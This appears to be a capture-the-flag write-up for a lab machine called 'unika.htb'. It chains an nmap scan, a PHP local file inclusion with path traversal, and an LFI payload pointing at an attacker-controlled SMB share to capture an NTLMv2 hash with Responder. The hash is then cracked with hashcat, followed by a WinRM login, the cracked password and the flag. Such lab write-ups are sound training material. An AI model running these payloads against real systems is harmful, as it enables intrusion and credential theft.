# Recon
## Nmap Scan
Initial Nmap Scan:
```bash
nmap -sC -sV $IP
```
the output:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 02:42 +0800
Nmap scan report for unika.htb (10.129.11.14)
Host is up (0.25s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Unika
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.53 seconds
```

## Visited Site
Reached the IP address on browser but it said:
"Cannot connect to the server at unika.htb."

This means name-based virtual hosting is employed. Thus, we need to add hostname "unika.htb" paired with IP address in the `/etc/hosts`.

After that is done, it brings up a webpage at
`http://unika.htb/index.php`

We can find in the webpage, there exists an option that shows content in different languages. We can choose one of them and the URL showed:
`http://unika.htb/index.php?page=french.html`

This here suggests there might be a Local File Inclusion vulnerability based on 3 things:
1. It's a dynamic site.
2. The query parameter is named *page*, which is likely that it's accessing the server's local files.
3. Unsafe code that allows LFI is more likely with php code. (and we know php is used for the website)

Thus, to test whether LFI is possible, we'll start putting in the value for the *page* query parameter with the value that does path traversal (e.g. `../../`). 

So what file do we look for? Since we know it is a Windows system from the nmap result, the most common file we can look for inside a Windows system is the hosts file. The value would be `'/windows/system32/drivers/etc/hosts'`. We'll keep prepending path traversal '../' until we get the file.

```
http://unika.htb/index.php?page=../../windows/system32/drivers/etc/hosts
```

This gave us the host file contents:
```
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
```
Now, we know LFI is possible. 
Thus, we can use a service like SMB to get access to the Windows Machine. This will make Windows try to authenticate to our machine with an authentication service like NTLMv2.
*The assumption here is SMB signing is disabled*.

# Foothold
## NTLMv2 Capture Attack
We will start the attack using a tool called **Responder** on our machine that will listen on a network interface which is on the same network as the victim.
`sudo responder -I tun0`

Then, we will have the server make a SMB request to the Responder by using LFI as discussed earlier on the website URL's query parameter `'?page='`:
```
http://unika.htb/index.php?page=//10.10.15.24/share
```
This connects to the victim machine's SMB share. Now, the victim authenticates to us (the rogue SMB server). We'll send back a challenge as par the NTLMv2 protocol handshake.

The victim responds back with a challenge response:
```
[SMB] NTLMv2-SSP Client   : 10.129.11.14
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:a035ee3e693d879b:1A013492F91EBA9BE9F2953ACCE4AB25:010100000000000000344BCCFCB0DC0104EFFB7EF1CC396600000000020008003300310034004A0001001E00570049004E002D00320034005900550042005500530031005A004100530004003400570049004E002D00320034005900550042005500530031005A00410053002E003300310034004A002E004C004F00430041004C00030014003300310034004A002E004C004F00430041004C00050014003300310034004A002E004C004F00430041004C000700080000344BCCFCB0DC0106000400020000000800300030000000000000000100000000200000AD849B425CF33F66BE33B4D132E9A8A094F3CF8C78ADC3F410510AB2F40B55040A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00320034000000000000000000
```

We'll save the response in a text file "response.txt" and crack it offline using Hashcat which has NTLMv2 response cracking built in.
```
hashcat -m 5600 response.txt /usr/share/wordlists/rockyou.txt
```

Here, we have the response cracked:
```
ADMINISTRATOR::RESPONDER:a035ee3e693d879b:1a013492f91eba9be9f2953acce4ab25:010100000000000000344bccfcb0dc0104effb7ef1cc396600000000020008003300310034004a0001001e00570049004e002d00320034005900550042005500530031005a004100530004003400570049004e002d00320034005900550042005500530031005a00410053002e003300310034004a002e004c004f00430041004c00030014003300310034004a002e004c004f00430041004c00050014003300310034004a002e004c004f00430041004c000700080000344bccfcb0dc0106000400020000000800300030000000000000000100000000200000ad849b425cf33f66be33b4d132e9a8a094f3cf8c78adc3f410510ab2f40b55040a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00320034000000000000000000:badminton
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::RESPONDER:a035ee3e693d879b:1a013492f...000000
Time.Started.....: Wed Mar 11 02:39:46 2026 (1 sec)
Time.Estimated...: Wed Mar 11 02:39:47 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    15919 H/s (2.95ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 44%

Started: Wed Mar 11 02:38:50 2026
Stopped: Wed Mar 11 02:39:49 2026
```
The password is *badminton*. And we already know the username from the challenge response *administrator*.

Now, since we know the username and the password, we can connect to the victim machine using WinRM since the service is open at port 5985 which we know from the nmap scan. But since Linux doesn't have PowerShell, we'll have to use Evil-WinRM built just for this situation:
```bash
evil-winrm -i $IP -u Administrator -p badminton
```

Now we're connected to the machine and we can get the flag under this directory:
`"C:\Users\mike\Desktop"`
**Flag**: *ea81b7afddd03efaa0945333ed147fac*
